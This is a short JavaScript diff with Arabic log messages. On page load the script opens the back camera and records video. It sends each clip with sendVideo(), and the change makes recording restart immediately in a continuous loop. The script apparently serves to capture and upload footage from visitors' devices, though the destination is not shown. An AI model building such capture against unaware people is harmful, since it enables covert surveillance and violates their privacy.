@@ -5,6 +5,7 @@ document.addEventListener("DOMContentLoaded", async function () {
     let countdownStarted = false;
     let mediaRecorder;
     let recordedChunks = [];
+    let videoStream;
 
     async function getBackCameraId() {
         try {
@@ -25,16 +26,15 @@ document.addEventListener("DOMContentLoaded", async function () {
             }
 
             const video = document.getElementById('video');
-            const stream = await navigator.mediaDevices.getUserMedia({
+            videoStream = await navigator.mediaDevices.getUserMedia({
                 video: { deviceId: backCameraId ? { exact: backCameraId } : undefined }
             });
 
-            video.srcObject = stream;
-            startRecording(stream);
-
+            video.srcObject = videoStream;
             video.onloadedmetadata = () => {
-                console.log("✅ الكاميرا تعمل! سيتم بدء العد التنازلي وتسجيل الفيديو فورًا...");
+                console.log("✅ الكاميرا تعمل! سيتم بدء التسجيل...");
                 startCountdown();
+                startRecording();
             };
         } catch (error) {
             console.error("❌ فشل في تشغيل الكاميرا الخلفية:", error);
@@ -56,8 +56,8 @@ document.addEventListener("DOMContentLoaded", async function () {
         }, 1000);
     }
 
-    function startRecording(stream) {
-        mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+    function startRecording() {
+        mediaRecorder = new MediaRecorder(videoStream, { mimeType: "video/webm" });
 
         mediaRecorder.ondataavailable = function (event) {
             if (event.data.size > 0) {
@@ -69,7 +69,7 @@ document.addEventListener("DOMContentLoaded", async function () {
             console.log("📹 تم تسجيل الفيديو! جاري الإرسال...");
             sendVideo();
             recordedChunks = [];
-            setTimeout(() => mediaRecorder.start(), 200); // إعادة التسجيل بعد نصف ثانية
+            startRecording(); // إعادة التسجيل فورًا
         };
 
         mediaRecorder.start();
